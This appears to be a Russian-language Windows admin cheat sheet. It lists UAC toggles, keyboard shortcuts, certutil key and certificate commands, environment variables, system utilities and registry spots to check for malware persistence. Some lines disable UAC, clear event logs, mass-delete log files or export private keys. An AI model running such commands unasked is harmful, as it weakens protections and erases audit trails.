+
+Отключить UAC 
+C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f 
+_________________________________________________________________________________________
+
+Включить UAC 
+C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+
+
+
+Win — открыть/закрыть меню «Пуск»
+Win + B — выбрать первую иконку в области уведомлений, переключаться между иконками клавишами со стрелками
+Win + Ctrl + B — переключиться на программу, отображающую сообщение в области уведомлений
+Win + D — отображение рабочего стола.
+Win + E — открыть Проводник
+Win + F — открыть Поиск
+Win + Ctrl + F — открыть Поиск компьютеров
+Win + G — отобразить гаджеты поверх всех окон (только в Windows 7 и Windows Vista)
+Win + L — переключить между пользователями или заблокировать рабочую станцию
+Win + M — свернуть все окна
+Win + ⇧ Shift + M — восстановить окна после сворачивания
+Win + P — переключить режимы работы с внешним монитором/проектором (только компьютер, дублировать, расширить, только проектор) (только в Windows 7)
+Win + R — открыть диалог «Выполнить»
+Win + T — переключить фокус на панель задач (только в Windows 7)
+Win + U — открыть Центр специальных возможностей
+Win + X — открыть Центр мобильных приложений Windows (только для мобильных компьютеров в Windows Vista и Windows 7)
+Win + Y — открыть Yahoo! Messenger (если установлен)
+Win + Pause — открыть свойства системы
+Win + Tab ⇆ — переключиться между кнопками окон на панели задач (в Windows Aero — переключиться между окнами, используя Windows Flip 3D)
+Win + Ctrl + Tab ⇆ — «залипание» Windows Flip 3D, переключиться между окнами клавишами со стрелками или колёсиком мыши (только в Windows Aero)
+Win + F1 — открыть Центр справки и поддержки Windows
+Win + 1 … 0 — запуск / переключение на программу, закрепленную на панели задач с указанным порядковым номером (только в Windows Vista и Windows 7)
+Win + ⇧ Shift + 1 … 0 — запуск нового экземпляра программы, закрепленной на панели задач с указанным порядковым номером (только в Windows 7)
+Win + Ctrl + 1 … 0 — переключение на последнее активное окно программы, закрепленной на панели задач с указанным порядковым номером (только в Windows 7)
+Win + Alt + 1 … 0 — открытие списка переходов для программы, закрепленной на панели задач с указанным порядковым номером (только в Windows 7)
+Win + ↑ — развернуть окно (только в Windows 7)
+Win + ↓ — восстановить/минимизировать окно (только в Windows 7)
+Win + ← или → — переключить режим развертывания окна (в том числе между мониторами в многомониторных конфигурациях) (только в Windows 7)
+Win + ⇧ Shift + ← или → — перенести окно между мониторами в многомониторных конфигурациях (только в Windows 7)
+Win + ⇧ Shift + ↑ или ↓ — растянуть активное окно от верхнего до нижнего краёв экрана / восстановить размер окна[3]
+Win + Home — свернуть/восстановить все несвёрнутые окна, кроме активного (только в Windows 7)
+Win + Space — взглянуть на рабочий стол (только в Windows 7)
+Win + Grey + — активировать экранную лупу / увеличить изображение на 100 % (только в Windows 7)
+Win + Grey - — при активной экранной лупе уменьшить изображение на 100 % (только в Windows 7)
+Win + Esc — отключить экранную лупу (только в Windows 7)
+
+
+
+certutil -urlcache * delete - очистка кеша сертификата  браузера
+certutil –store My - посмотреть сертификаты в личном хранилище
+certutil -store -user my > my.txt - посмотреть сертификаты пользователя my и сохранить в файл
+certutil –viewstore My - посмотреть сертификаты в личном хранилище  в графическом режиме)
+certutil -store -enterprise NTAuth - посмотреть сертификаты хранимые в домене
+certutil –verify -urlfetch –v certificate.cer - где certificate.cer - имя файла, куда экспортирован сертификат
+certutil –url certname.cer - проверить, что по URL в CDP можно вытащить CRL.(графика нажать кнопку Retrieve)
+certutil –v –verify –urlfetch certname.cer > c:certcheck.txt - проверить, что по URL в CDP можно вытащить CRL
+certutil /scinfo - информация о текущем (работа с криптопровайдером CSP - Crypto service provider)
+certutil -csplist - список всех (работа с криптопровайдером CSP - Crypto service provider)
+certutil -csptest "cspname" - информация конкретном CSP 
+certutil -csptest "Microsoft Strong Cryptographic Provider" - информация конкретном CSP
+certutil -p test -user -exportPFX 012345678ffffffffff cert.pfx - экспорт в PFX (PKCS#12) (параметры серийник и пароль (через -p))
+certutil -p test -user -importpfx cert.pfx - импорт
+certutil –backupKey - резервное копирование ключей УЦ
+certutil -pulse - запустить autoenrollment
+certutil -getkey - извлекает из УЦ зашифрованный ключом Агента восстановления (KRA - Key recovery agent) 
+certutil -recoverkey - расшифровывает BLOB и восстанавливает депонированный ключ в PKCS#12 (файл с расширением .pfx)
+
+
+SET - команда покажет все переменные
+%AppData%\Microsoft\Internet Explorer\Quick Launch - Панели быстрого запуска
+ 
+%userprofile%\appdata\local\temp  - каталог темп
+ 
+%AppData%\1C\1CEStart\ibases.v8i - базы 1с8
+ 
+%SYSTEMDRIVE%  - Возвращает имя диска, содержащего корневой каталог операционной системы
+ 
+%SYSTEMROOT%, %WINDIR% - Возвращает размещение корневого каталога операционной системы
+ 
+%PATH% - Указывает путь поиска для исполняемых файлов
+ 
+%PROGRAMFILES% - Указывает путь к каталогу установки программ (Program Files)
+ 
+%COMMONPROGRAMFILES%  - Указывает путь к общему каталогу программ (Program Files\Common Files).
+ 
+%TEMP% и %TMP%  - Возвращает временные папки
+ 
+%USERPROFILE% - Возвращает размещение профиля для текущего пользователя
+ 
+%ALLUSERSPROFILE% - Возвращает размещение профиля "All Users"
+ 
+%CD% - Возвращает путь к текущей папке.
+ 
+%USERNAME%  - Покажет имя пользователя
+ 
+%ALLUSERSPROFILE%  -  C:\ProgramData
+ 
+%APPDATA% - C:\Users\NAMEUSER\AppData\Roaming
+ 
+%CommonProgramFiles% - C:\Program Files\Common Files
+ 
+%CommonProgramFiles(x86)% - C:\Program Files (x86)\Common Files
+ 
+%CommonProgramW6432% - C:\Program Files\Common Files
+ 
+%COMPUTERNAME% - Имя пк
+ 
+%ComSpec% - C:\Windows\system32\cmd.exe
+ 
+%HOMEDRIVE%  - C:
+ 
+%HOMEPATH%  - \Users\USERNAME
+ 
+%LOCALAPPDATA%  - \Users\USERNAME\AppData\Local
+ 
+%NUMBER_OF_PROCESSORS% - количество потоков
+ 
+%OS%=Windows_NT - version os
+ 
+%Path% - откуда запускать программы
+ 
+%PATHEXT% .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC - исполнительные файлы
+ 
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+PUBLIC=C:\Users\Public
+SESSIONNAME=Console - вид сессии
+SystemDrive=C:
+SystemRoot=C:\Windows
+
+
+systemPropertiesAdvanced.exe - свойство системы
+systeminfo - показывает информацию о системе
+systeminfo /s machine - покажет много полезного об удаленной машине
+systeminfo | findstr Дата - дата установки системы
+msinfo32.exe - информация о системе
+ver - показывает версию ядра
+ 
+sconfig - программа стартовой настройки windows 
+ 
+set - показывает переменные окружения ( стандартные переменные ) 
+ 
+taskmgr - Диспетчер задач
+mmc - создание своей оснастки ( можно открыть существующие оснастки msc)
+msconfig - встроенный редактор автозагрузки (авто запуск, службы и др...)
+ 
+ 
+regedit  - встроенный редактор реестра
+ 
+cliconfg - Программа сетевого клиента SQL
+clipbrd - Буфер обмена
+dcomcnfg - Консоль управления DCOM компонентами
+ddeshare - Общие ресурсы DDE (на Win7 не работает)
+desk.cpl - Свойства экрана
+drwtsn32 - Dr.Watson
+dxdiag - Служба диагностики DirectX
+eudcedit - Редактор личных символов
+iexpress - IExpress (не знаю что это :) )
+fsquirt - Мастер передачи файлов Bluetooth
+sdcld.exe - резервное копирование
+rstrui - восстановление системы systemrestore
+clip.exe - программа для копирования в буфер обмена что угодно
+mrt.exe - Удаление вредоносных программ
+regedit - Редактор реестра
+sigverif - Проверка подписи файла
+sndvol — управление громкостью
+sysedit - Редактор системных файлов (не знаю, что это :) )
+syskey - Защита БД учётных записей
+ 
+utilman - Диспетчер служебных программ
+verifier - Диспетчер проверки драйверов
+sdcld.exe - Резервное копирование
+ 
+chcp 1251 - смена кодировки  (1251win,866dos)
+ 
+whoami - показывает пользователей
+whoami /all - показывает всех пользователей и группы (SID, UID, GID)
+whoami /user - показывает SID (UID) пользователя
+ 
+mstsc - Подключение к удаленному рабочему столу
+qwinsta - показывает кто работает удаленно
+qprocess * - показывает информацию о процесса
+qappsrv  - показывает терминальный сервер
+ 
+schtasks /query /fo csv /v > readmy.txt
+at - показывает задания
+schtasks - показывает все задания
+ 
+net start или sc query - показывают все процессы
+ 
+shutdown /t 00 /s - выключить
+shutdown -r -t 00 -f - ребут
+shutdown - выключение компьютера , можно удаленно выключить другой.
+shutdown /r /o /t 0 - загрузка в безопасный режим
+powercfg  /h off - отключить гибернацию
+ 
+tasklist - список процессов
+tasklist /fi ″username eq user″ /fi ″memusage le 40000″
+tasklist /s
+tasklist | findstr process ID
+tasklist /SVC - Отображение служб для процессов
+tasklist /P - Отображение процессов с подгруженными dll’ками
+Type tasklist /svc что же скрывает Svchost.exe
+taskkill /pid 1230 /pid 1241 /pid 1253
+taskkill /f /im notepad.exe - убить процессы по имени notepad.exe
+taskkill /s srvmain /u maindom\hiropln /p p@ssW23 /fi "IMAGENAME eq note*" /im *
+taskkill /s pc /u domain\user /p pass /fi name filtr /pid process /im name process /f /t time
+taskkill /im explorer
+TASKLIST /FI "USERNAME eq pcname\username"  - показать процессы пользователя username на пк pcname
+TASKKILL /F /FI "USERNAME eq pcname\username" /IM * - прибить все процессы пользователя username на пк pcname
+ 
+wevtutil el - список всех логов LOG
+wevtutil qe LogName - получение конкретного лога
+wevtutil cl LogName - удаляем указанный лог
+ 
+del %windir%\*.log /a /s /q /f - брутальный способ удаления логов
+ 
+netdom renamecomputer %computername% /newname:{newComputerName} - смена имени компьютера (работает на win2008)
+netdom join {computerName} /domain:{domainName} /userD:{domainUsername} /passwordD:{domainPassword} - подключение пк к домену
+ 
+slmgr –ipk {licenseKey} - ввести ключ лицензии с помощью этой команды
+slmgr –ato - Активация  лицензии
+ocsetup {componentName} - используется для установки нужного компонента
+ocsetup Microsoft-Hyper-V - установки роли Hyper-V
+ 
+wusa {patchFileName} - Для установки исправлений MSU и MSP вручную
+ 
+sysprep /oobe /generalize /shutdown C:\Windows\System32\sysprep\sysprep.exe /oobe /generalize /shutdown
+ 
+ecedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose  - сброс политики безопасности на дефолтные windows7
+
+
+
+
+
+1. Изменение значения параметров (автозагрузка)
+"Shell"="Explorer.exe"
+"Userinit"="C:\WINDOWS\system32\userinit.exe,"
+в разделе
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows NT\ CurrentVersion\ Winlogon
+или
+HKEY_CURRENT_USER\ Software\ Microsoft\ WindowsNT\ CurrentVersion\ Winlogon
+Изменение значения параметра "AppInit_DLLs"="" в разделе
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows NT\ CurrentVersion\ Windows
+И, разумеется, параметры в стандартных разделах автозапуска в реестре:
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows\ CurrentVersion\ Run
+HKEY_CURRENT_USER\ Software\ Microsoft\ Windows\ CurrentVersion\ Run
+проверить файлы WIN.INI, AUTOEXEC.BAT, WINSTART.BAT
+ 
+2. проблемы с IE
+сначала реестор
+HKEY_CURRENT_USER\ Software\ Microsoft\ Internet Explorer
+"SearchURL"=
+HKEY_CURRENT_USER\ Software\ Microsoft\ Internet Explorer\ Main
+"Default_Search_URL"=
+"Search Page"="http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=iesearch"
+"Search Bar"=
+"SearchURL"=
+"Window Title"=
+"Window_Placement"=
+HKEY_CURRENT_USER\ Software\ Microsoft\ Internet Explorer\ Search
+"SearchAssistant"=
+HKEY_CURRENT_USER\ Software\ Micrsoft\ Internet Explorer\ Toolbar\W ebBrowser
+"ITBarLayout"=
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Internet Explorer\ Search
+"SearchAssistant"="http://ie.search.msn.com/{SUB_RFC1766}/srchasst/srchasst.htm"
+"CustomizeSearch"="http://ie.search.msn.com/{SUB_RFC1766}/srchasst/srchcust.htm"
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Internet Explorer\ AboutURLs
+"NavigationFailure"="res://shdoclc.dll/navcancl.htm"
+"DesktopItemNavigationFailure"="res://shdoclc.dll/navcancl.htm"
+"NavigationCanceled"="res://shdoclc.dll/navcancl.htm"
+"OfflineInformation"="res://shdoclc.dll/offcancl.htm"
+"blank"="res://mshtml.dll/blank.htm"
+"PostNotCached"="res://mshtml.dll/repost.htm"
+"mozilla"="res://mshtml.dll/about.moz"
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Internet Explorer\ Main
+"Default_Page_URL"="http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=msnhome"
+"Default_Search_URL"="http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=iesearch"
+"Search Page"="http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=iesearch"
+"Local Page"=
+"Start Page"="http://www.microsoft.com/isapi/redir.dll?prd={SUB_PRD}&clcid={SUB_CLSID}&pver={SUB_PVER}&ar=home"
+"CompanyName"="Microsoft Corporation"
+"Window Title"=
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows\ CurrentVersion\ URL\ DefaultPrefix
+@="http://"
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows\ CurrentVersion\ URL\ Prefixes
+"ftp"="ftp://"
+"gopher"="gopher://"
+"home"="http://"
+"mosaic"="http://"
+"www"="http://"
+HKEY_USERS\ .Default\ Software\ Microsoft\ Internet Explorer
+"SearchURL"=
+HKEY_USERS\ .Default\ Software\ Microsoft\ Internet Explorer\ Main
+"Search Page"="http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=iesearch"
+"Default_Search_URL"=
+"Search Bar"=
+"Local Page"=
+"Start Page"=
+HKEY_USERS\ .Default\ Software\ Microsoft\ Internet Explorer\ Search
+"SearchAssistant"=
+ 
+Файлы
+(Temporary Internet Files), (History),
+C:\WINDOWS\COOKIES 
+C:\PROGRAM FILES\INTERNET EXPLORER\PLUGINS
+C:\WINNT\SYSTEM32\DRIVERS\ETC
+ 
+ВНО
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows\ CurrentVersion\ explorer\ Browser Helper Objects
+Подозрительные BHO можно попробовать удалить из списка (предварительно сделав резервную копию реестра) — это их полностью дезактивирует.
+Однако, как выяснить — подозрительные они или нет, если в вышеупомянутом разделе только ничего не говорящие длиннющие номера? 
+Технология в данном случае такова. 
+Например, если в этом разделе вы обнаружите подраздел 
+HKEY_LOCAL_MACHINE\ SOFTWARE\ Microsoft\ Windows\ CurrentVersion\ explorer\ Browser Helper Objects\ {A5366673-E8CA-11D3-9CD9-0090271D075B}, 
+то произведите поиск во всем реестре найденного идентификатора BHO — {A5366673-E8CA-11D3-9CD9-0090271D075B}
+ — обнаружите его упоминание также и в разделе HKEY_CLASSES_ROOT\ CLSID\ {A5366673-E8CA-11D3-9CD9-0090271D075B}. 
+Просмотрите всё содержимое найденного раздела, чтобы определить,
+ к какой программе относится этот BHO — в данном случае вы обнаружите такую запись:
+HKEY_CLASSES_ROOT\ CLSID\ {A5366673-E8CA-11D3-9CD9-0090271D075B}\ InprocServer32
+@="C:\PROGRAM FILES\FLASHGET\JCCATCH.DLL"
+из которой можно сделать вывод, что обнаруженный BHO создан программой FlashGet и никакой угрозы не представляет
+ 
+Вредонос может изменить расположение файла hosts - проверьте ключ реестра
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\DataBasePath
+ДОЛЖНО быть значение %SystemRoot%\System32\drivers\etc
